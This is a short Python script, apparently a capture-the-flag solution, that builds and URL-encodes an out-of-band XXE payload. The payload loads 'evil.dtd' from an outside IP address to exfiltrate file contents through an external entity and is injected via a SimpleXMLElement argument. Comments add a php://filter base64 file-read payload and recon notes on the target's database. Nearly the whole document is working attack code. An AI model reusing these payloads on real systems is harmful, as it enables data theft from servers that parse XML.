# -*- coding:utf-8 -*-
import requests
import urllib

data = """<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://123.206.203.108/evil.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
"""

print urllib.quote_plus(data)

# module=SimpleXMLElement&args[]=<%3Fxml+version%3D"1.0"+%3F>%0A<%21DOCTYPE+r+%5B%0A<%21ELEMENT+r+ANY+>%0A<%21ENTITY+%25+sp+SYSTEM+"http%3A%2F%2F123.206.203.108%2Fevil.dtd">%0A%25sp%3B%0A%25param1%3B%0A%5D>%0A<r>%26exfil%3B<%2Fr>%0A&args[]=2

# php://filter/convert.base64-encode/resource=http://web.suctf.asuri.org:84/show.php?action=view&filename=123.txt
# version: 10.0.34-MariaDB-0ubuntu0.16.04
# database: calc
# table: file, user